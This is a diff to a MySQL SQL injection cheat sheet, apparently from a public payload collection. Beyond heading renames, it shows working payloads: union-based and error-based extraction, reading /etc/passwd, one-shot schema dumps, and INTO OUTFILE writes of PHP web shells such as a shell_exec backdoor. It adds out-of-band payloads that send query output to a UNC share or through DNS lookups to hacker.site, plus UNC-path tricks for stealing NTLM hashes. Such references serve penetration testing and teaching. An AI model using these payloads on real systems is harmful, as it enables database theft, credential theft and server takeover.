@@ -1,12 +1,12 @@
 # MYSQL Injection
 
-## MySQL
+## MYSQL
 
 ```sql
 # MYSQL Comment
 /* MYSQL Comment */
 /*! MYSQL Special SQL */
-/*!32302 10*/ Comment for MySQL version 3.23.02
+/*!32302 10*/ Comment for MYSQL version 3.23.02
 ```
 
 ## Detect columns number
@@ -21,7 +21,7 @@ order by 3
 order by XXX
 ```
 
-## MySQL Union Based
+## MYSQL Union Based
 
 ```sql
 UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
@@ -30,7 +30,7 @@ UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_sc
 UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
 ```
 
-## MySQL Error Based - Basic
+## MYSQL Error Based - Basic
 
 ```sql
 (select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
@@ -109,7 +109,7 @@ OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
 ' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
 ```
 
-## MySQL DIOS - Dump in One Shot
+## MYSQL DIOS - Dump in One Shot
 
 ```sql
 (select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#
@@ -126,4 +126,31 @@ SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo
 [...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
 ```
 
+## MYSQL Out of band
+
+```powershell
+select @@version into outfile '\\\\192.168.0.100\\temp\\out.txt';
+select @@version into dumpfile '\\\\192.168.0.100\\temp\\out.txt
+```
+
+DNS exfiltration
+
+```sql
+select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
+select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874))
+```
+
+UNC Path - NTLM hash stealing
+
+```sql
+select load_file('\\\\error\\abc');
+select load_file(0x5c5c5c5c6572726f725c5c616263);
+select 'osanda' into dumpfile '\\\\error\\abc';
+select 'osanda' into outfile '\\\\error\\abc';
+load data infile '\\\\error\\abc' into table database.table_name;
+```
+
+
 ## References
+
+- [MySQL Out of Band Hacking - @OsandaMalith](https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf)
